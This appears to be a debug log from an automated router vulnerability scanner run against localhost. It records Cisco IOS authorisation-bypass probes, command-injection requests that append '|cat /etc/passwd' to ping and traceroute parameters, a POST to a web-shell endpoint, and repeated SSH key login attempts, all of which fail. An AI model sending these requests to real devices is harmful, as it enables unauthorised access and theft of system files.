+2019-02-24 10:30:57,492 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/41/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,495 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,498 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/42/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,501 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,506 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/43/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,517 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,518 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:57,520 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/44/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,524 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,527 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/45/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,531 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,533 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/46/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,548 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,551 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/47/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,561 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,562 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:57,564 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/48/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,570 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,572 DEBUG paramiko.transport       starting thread (client mode): 0x991fb898
+2019-02-24 10:30:57,573 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:57,574 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/49/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,580 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,587 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:57,588 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:57,592 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:57,592 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:57,592 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:57,593 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:57,593 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:57,594 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/50/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,594 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:57,599 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,621 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/51/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,625 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,628 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/52/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,634 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,637 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/53/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,642 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,647 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/54/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,651 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,654 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/55/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,672 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:57,678 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,686 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:57,699 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:57,708 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/56/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,709 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:57,713 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,714 DEBUG paramiko.transport       Trying SSH key b'e44d3e11db3f06be3140d8fe038e468b'
+2019-02-24 10:30:57,723 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/57/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,728 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,737 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:57,754 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/58/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,763 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,805 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:57,816 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/59/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,830 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,843 DEBUG paramiko.transport       starting thread (client mode): 0x991fb4e0
+2019-02-24 10:30:57,864 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:57,875 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:57,881 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:57,882 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/60/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,910 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,921 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:57,937 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:57,938 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:57,943 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:57,954 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:57,955 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:57,960 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:57,961 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/61/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,976 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,014 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/62/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,033 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,072 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/63/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,079 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,082 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,083 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,084 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/64/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,086 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,090 DEBUG paramiko.transport       Trying SSH key b'0c8949f762d298f02775ade9722c68c3'
+2019-02-24 10:30:58,094 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,096 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/65/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,102 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,104 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/66/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,108 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,110 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/67/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,116 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,118 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/68/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,122 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,124 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,124 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/69/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,135 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,136 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/70/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,141 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,142 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,144 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/71/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,149 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,152 DEBUG paramiko.transport       starting thread (client mode): 0x90661828
+2019-02-24 10:30:58,153 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:58,154 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/72/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,159 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,161 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/73/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,166 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,166 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:58,167 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:58,169 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/74/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,171 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:58,175 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,175 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:58,176 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:58,177 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:58,177 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:58,178 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/75/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,178 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:58,185 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,187 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/76/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,192 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,194 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/77/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,199 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,201 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/78/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,209 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,211 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/79/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,217 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,218 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,220 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/80/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,220 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,225 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,227 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,228 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/81/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,229 DEBUG paramiko.transport       Trying SSH key b'b811320998f47d9470b85c03f270a421'
+2019-02-24 10:30:58,233 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,235 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/82/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,238 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,240 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/83/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,243 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,244 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:58,246 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/84/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,250 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,252 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/85/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,256 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,258 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/86/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,261 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,262 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,267 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/87/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,272 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,274 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/88/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,279 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,280 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/89/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,284 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,286 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,288 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/90/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,294 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,295 DEBUG paramiko.transport       starting thread (client mode): 0x98147c18
+2019-02-24 10:30:58,296 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:58,297 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/91/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,301 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,302 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/92/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,307 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,308 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:58,308 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:58,309 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/93/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,314 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,315 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:58,316 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:58,316 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:58,317 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/94/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,318 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:58,322 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,322 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:58,323 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:58,324 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/95/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,329 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,332 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/96/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,337 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,338 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/97/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,342 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,344 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/98/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,347 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,349 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/99/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:58,353 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,356 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:30:58,360 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,363 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:30:58,369 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,372 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,373 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7Ccat+/etc/passwd; HTTP/1.1" 404 None
+2019-02-24 10:30:58,374 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,379 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,381 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,382 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /web_shell_cmd.gch HTTP/1.1" 404 169
+2019-02-24 10:30:58,387 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,388 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:58,389 DEBUG paramiko.transport       Trying SSH key b'22c8a9c301a01731a543f2704a1c55f6'
